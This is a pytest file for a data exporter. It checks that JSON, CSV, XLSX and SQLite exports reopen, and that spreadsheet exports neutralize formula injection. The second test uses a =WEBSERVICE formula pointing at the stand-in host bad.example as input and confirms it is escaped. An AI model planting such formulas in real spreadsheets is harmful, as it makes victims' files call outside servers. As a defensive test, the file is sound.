import csv
import json
import sqlite3

from openpyxl import load_workbook

from weaver.exporters import write_bundle, write_exports


def test_every_export_reopens(tmp_path) -> None:
    rows = [
        {"title": "Trail Mug", "price": "$24", "tags": ["camp", "steel"]},
        {"title": "Field Spoon", "price": "$9", "tags": ["camp"]},
    ]
    paths = write_exports(tmp_path, rows)
    assert len(json.loads(paths["json"].read_text())) == 2
    assert len(paths["jsonl"].read_text().splitlines()) == 2
    with paths["csv"].open() as handle:
        assert len(list(csv.DictReader(handle))) == 2
    assert len(list(load_workbook(paths["xlsx"], read_only=True).active.iter_rows(values_only=True))) == 3
    with sqlite3.connect(paths["sqlite"]) as connection:
        assert connection.execute("SELECT COUNT(*) FROM data").fetchone()[0] == 2
    assert write_bundle(tmp_path).is_file()


def test_spreadsheet_exports_neutralize_formulas(tmp_path) -> None:
    paths = write_exports(tmp_path, [{"name": "=WEBSERVICE(\"https://bad.example\")", "value": 7}])
    with paths["csv"].open(encoding="utf-8") as handle:
        assert "'=WEBSERVICE" in handle.read()
    workbook = load_workbook(paths["xlsx"], read_only=True)
    assert workbook.active["A2"].value.startswith("'=WEBSERVICE")
